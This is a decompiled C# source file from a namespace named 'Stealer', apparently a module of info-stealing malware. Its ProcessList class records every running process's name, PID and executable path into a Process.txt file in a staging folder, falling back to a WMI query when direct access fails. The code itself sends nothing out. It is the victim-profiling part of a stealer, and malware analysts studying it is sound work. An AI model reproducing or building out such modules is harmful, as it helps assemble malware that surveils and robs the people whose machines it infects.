﻿using System;
using System.Diagnostics;
using System.IO;
using System.Management;

namespace Stealer
{
	// Token: 0x02000023 RID: 35
	internal sealed class ProcessList
	{
		// Token: 0x060000A5 RID: 165 RVA: 0x00005A70 File Offset: 0x00003C70
		public static void WriteProcesses(string sSavePath)
		{
			foreach (Process process in Process.GetProcesses())
			{
				File.AppendAllText(sSavePath + "\\Process.txt", string.Concat(new string[]
				{
					"NAME: ",
					process.ProcessName,
					"\n\tPID: ",
					process.Id.ToString(),
					"\n\tEXE: ",
					ProcessList.ProcessExecutablePath(process),
					"\n\n"
				}));
			}
		}

		// Token: 0x060000A6 RID: 166 RVA: 0x00005AF4 File Offset: 0x00003CF4
		public static string ProcessExecutablePath(Process process)
		{
			try
			{
				return process.MainModule.FileName;
			}
			catch
			{
				foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("SELECT ExecutablePath, ProcessID FROM Win32_Process").Get())
				{
					ManagementObject managementObject = (ManagementObject)managementBaseObject;
					object obj = managementObject["ProcessID"];
					object obj2 = managementObject["ExecutablePath"];
					if (obj2 != null && obj.ToString() == process.Id.ToString())
					{
						return obj2.ToString();
					}
				}
			}
			return "";
		}
	}
}
